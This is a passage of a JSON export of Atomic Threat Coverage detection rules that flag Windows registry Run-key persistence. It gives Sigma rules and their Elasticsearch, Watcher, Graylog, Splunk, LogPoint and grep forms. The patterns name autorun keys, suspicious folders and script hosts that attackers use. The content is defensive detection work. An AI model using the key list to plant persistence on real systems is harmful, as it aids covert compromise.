TargetObject.keyword:*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Policies\\\\\\\\\\\\\\\\Explorer\\\\\\\\\\\\\\\\Run AND Details.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\$Recycle.bin\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Policies\\\\\\\\\\\\\\\\Explorer\\\\\\\\\\\\\\\\Run AND Details.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\$Recycle.bin\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Registry Persistence via Explorer Run Key\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      Image = {{_source.Image}}\\\\nParentImage = {{_source.ParentImage}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run AND Details.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\* C\\\\:\\\\\\\\ProgramData\\\\\\\\* *\\\\\\\\AppData\\\\\\\\* C\\\\:\\\\\\\\$Recycle.bin\\\\\\\\* C\\\\:\\\\\\\\Temp\\\\\\\\* C\\\\:\\\\\\\\Users\\\\\\\\Public\\\\\\\\* C\\\\:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" TargetObject=\"*\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run\" (Details=\"C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*\" OR Details=\"C:\\\\\\\\ProgramData\\\\\\\\*\" OR Details=\"*\\\\\\\\AppData\\\\\\\\*\" OR Details=\"C:\\\\\\\\$Recycle.bin\\\\\\\\*\" OR Details=\"C:\\\\\\\\Temp\\\\\\\\*\" OR Details=\"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\" OR Details=\"C:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\")) | table Image,ParentImage", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject=\"*\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run\" Details IN [\"C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*\", \"C:\\\\\\\\ProgramData\\\\\\\\*\", \"*\\\\\\\\AppData\\\\\\\\*\", \"C:\\\\\\\\$Recycle.bin\\\\\\\\*\", \"C:\\\\\\\\Temp\\\\\\\\*\", \"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\", \"C:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*.*\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run)(?=.*(?:.*C:\\\\Windows\\\\Temp\\\\\\\\.*|.*C:\\\\ProgramData\\\\\\\\.*|.*.*\\\\AppData\\\\\\\\.*|.*C:\\\\\\\\$Recycle\\\\.bin\\\\\\\\.*|.*C:\\\\Temp\\\\\\\\.*|.*C:\\\\Users\\\\Public\\\\\\\\.*|.*C:\\\\Users\\\\Default\\\\\\\\.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: New RUN Key Pointing to Suspicious Folder\nid: 02ee49e2-e294-4d0f-9278-f5b3212fc588\nstatus: experimental\ndescription: Detects suspicious new RUN key element pointing to an executable in a suspicious folder\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\nauthor: Florian Roth, Markus Neis\ntags:\n    - attack.persistence\n    - attack.t1060\ndate: 2018/25/08\nmodified: 2019/10/01\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject: \n          - '*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\*'\n          - '*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\\*'\n        Details:\n          - '*C:\\Windows\\Temp\\\\*'\n          - '*\\AppData\\\\*'\n          - '%AppData%\\\\*'\n          - '*C:\\$Recycle.bin\\\\*'\n          - '*C:\\Temp\\\\*'\n          - '*C:\\Users\\Public\\\\*'\n          - '%Public%\\\\*'\n          - '*C:\\Users\\Default\\\\*'\n          - '*C:\\Users\\Desktop\\\\*'\n          - 'wscript*'\n          - 'cscript*'\n    condition: selection\nfields:\n    - Image\nfalsepositives:\n    - Software with rare behaviour\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: New RUN Key Pointing to Suspicious Folder\nid: 02ee49e2-e294-4d0f-9278-f5b3212fc588\nstatus: experimental\ndescription: Detects suspicious new RUN key element pointing to an executable in a suspicious folder\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\nauthor: Florian Roth, Markus Neis\ntags:\n    - attack.persistence\n    - attack.t1060\ndate: 2018/25/08\nmodified: 2019/10/01\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject: \n          - '*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\*'\n          - '*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\\*'\n        Details:\n          - '*C:\\Windows\\Temp\\\\*'\n          - '*\\AppData\\\\*'\n          - '%AppData%\\\\*'\n          - '*C:\\$Recycle.bin\\\\*'\n          - '*C:\\Temp\\\\*'\n          - '*C:\\Users\\Public\\\\*'\n          - '%Public%\\\\*'\n          - '*C:\\Users\\Default\\\\*'\n          - '*C:\\Users\\Desktop\\\\*'\n          - 'wscript*'\n          - 'cscript*'\n    condition: selection\nfields:\n    - Image\nfalsepositives:\n    - Software with rare behaviour\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\* OR *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce\\\\\\\\*) AND Details.keyword:(*C\\\\:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\* OR *\\\\\\\\AppData\\\\\\\\* OR %AppData%\\\\\\\\* OR *C\\\\:\\\\\\\\$Recycle.bin\\\\\\\\* OR *C\\\\:\\\\\\\\Temp\\\\\\\\* OR *C\\\\:\\\\\\\\Users\\\\\\\\Public\\\\\\\\* OR %Public%\\\\\\\\* OR *C\\\\:\\\\\\\\Users\\\\\\\\Default\\\\\\\\* OR *C\\\\:\\\\\\\\Users\\\\\\\\Desktop\\\\\\\\* OR wscript* OR cscript*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/New-RUN-Key-Pointing-to-Suspicious-Folder <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"New RUN Key Pointing to Suspicious Folder\",\\n    \"description\": \"Detects suspicious new RUN key element pointing to an executable in a suspicious folder\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1060\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnce\\\\\\\\\\\\\\\\*) AND Details.keyword:(*C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR %AppData%\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\$Recycle.bin\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR %Public%\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Desktop\\\\\\\\\\\\\\\\* OR wscript* OR cscript*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnce\\\\\\\\\\\\\\\\*) AND Details.keyword:(*C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR %AppData%\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\$Recycle.bin\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR %Public%\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Default\\\\\\\\\\\\\\\\* OR *C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Desktop\\\\\\\\\\\\\\\\* OR wscript* OR cscript*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'New RUN Key Pointing to Suspicious Folder\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nImage = {{_source.Image}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\* *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce\\\\\\\\*) AND Details.keyword:(*C\\\\:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\* *\\\\\\\\AppData\\\\\\\\* %AppData%\\\\\\\\* *C\\\\:\\\\\\\\$Recycle.bin\\\\\\\\* *C\\\\:\\\\\\\\Temp\\\\\\\\* *C\\\\:\\\\\\\\Users\\\\\\\\Public\\\\\\\\* %Public%\\\\\\\\* *C\\\\:\\\\\\\\Users\\\\\\\\Default\\\\\\\\* *C\\\\:\\\\\\\\Users\\\\\\\\Desktop\\\\\\\\* wscript* cscript*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\" OR TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce\\\\\\\\*\") (Details=\"*C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*\" OR Details=\"*\\\\\\\\AppData\\\\\\\\*\" OR Details=\"%AppData%\\\\\\\\*\" OR Details=\"*C:\\\\\\\\$Recycle.bin\\\\\\\\*\" OR Details=\"*C:\\\\\\\\Temp\\\\\\\\*\" OR Details=\"*C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\" OR Details=\"%Public%\\\\\\\\*\" OR Details=\"*C:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\" OR Details=\"*C:\\\\\\\\Users\\\\\\\\Desktop\\\\\\\\*\" OR Details=\"wscript*\" OR Details=\"cscript*\")) | table Image", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\", \"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce\\\\\\\\*\"] Details IN [\"*C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*\", \"*\\\\\\\\AppData\\\\\\\\*\", \"%AppData%\\\\\\\\*\", \"*C:\\\\\\\\$Recycle.bin\\\\\\\\*\", \"*C:\\\\\\\\Temp\\\\\\\\*\", \"*C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\", \"%Public%\\\\\\\\*\", \"*C:\\\\\\\\Users\\\\\\\\Default\\\\\\\\*\", \"*C:\\\\\\\\Users\\\\\\\\Desktop\\\\\\\\*\", \"wscript*\", \"cscript*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\\\\.*|.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\\\\\.*))(?=.*(?:.*.*C:\\\\Windows\\\\Temp\\\\\\\\.*|.*.*\\\\AppData\\\\\\\\.*|.*%AppData%\\\\\\\\.*|.*.*C:\\\\\\\\$Recycle\\\\.bin\\\\\\\\.*|.*.*C:\\\\Temp\\\\\\\\.*|.*.*C:\\\\Users\\\\Public\\\\\\\\.*|.*%Public%\\\\\\\\.*|.*.*C:\\\\Users\\\\Default\\\\\\\\.*|.*.*C:\\\\Users\\\\Desktop\\\\\\\\.*|.*wscript.*|.*cscript.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Direct autorun keys modification\nid: 24357373-078f-44ed-9ac4-6d334a668a11\ndescription: Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.\nstatus: experimental\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1060/T1060.yaml\ntags:\n    - attack.persistence\n    - attack.t1060\ndate: 2019/10/25\nmodified: 2019/11/10\nauthor: Victor Sergeev, Daniil Yugoslavskiy, oscd.community\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '*\\reg.exe'\n        CommandLine|contains: 'add' # to avoid intersection with discovery tactic rules\n    selection_2:\n        CommandLine|contains:       # need to improve this list, there are plenty of ASEP reg keys\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Run'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunServices'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n            - '\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell'\n    condition: selection_1 and selection_2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Direct autorun keys modification\nid: 24357373-078f-44ed-9ac4-6d334a668a11\ndescription: Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.\nstatus: experimental\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1060/T1060.yaml\ntags:\n    - attack.persistence\n    - attack.t1060\ndate: 2019/10/25\nmodified: 2019/11/10\nauthor: Victor Sergeev, Daniil Yugoslavskiy, oscd.community\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '*\\reg.exe'\n        CommandLine|contains: 'add' # to avoid intersection with discovery tactic rules\n    selection_2:\n        CommandLine|contains:       # need to improve this list, there are plenty of ASEP reg keys\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Run'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunServices'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell'\n            - '\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows'\n            - '\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n            - '\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell'\n    condition: selection_1 and selection_2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\reg.exe AND CommandLine.keyword:*add* AND CommandLine.keyword:(*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Windows* OR *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\User\\\\ Shell\\\\ Folders* OR *\\\\\\\\system\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\SafeBoot\\\\\\\\AlternateShell*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Direct-autorun-keys-modification <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Direct autorun keys modification\",\\n    \"description\": \"Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1060\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\reg.exe AND CommandLine.keyword:*add* AND CommandLine.keyword:(*\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnce* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnceEx* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunServices* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunServicesOnce* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Winlogon\\\\\\\\\\\\\\\\Userinit* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Winlogon\\\\\\\\\\\\\\\\Shell* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Windows* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Explorer\\\\\\\\\\\\\\\\User\\\\\\\\ Shell\\\\\\\\ Folders* OR *\\\\\\\\\\\\\\\\system\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\SafeBoot\\\\\\\\\\\\\\\\AlternateShell*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\reg.exe AND CommandLine.keyword:*add* AND CommandLine.keyword:(*\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnce* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunOnceEx* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunServices* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\RunServicesOnce* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Winlogon\\\\\\\\\\\\\\\\Userinit* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Winlogon\\\\\\\\\\\\\\\\Shell* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Windows* OR *\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Explorer\\\\\\\\\\\\\\\\User\\\\\\\\ Shell\\\\\\\\ Folders* OR *\\\\\\\\\\\\\\\\system\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\SafeBoot\\\\\\\\\\\\\\\\AlternateShell*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    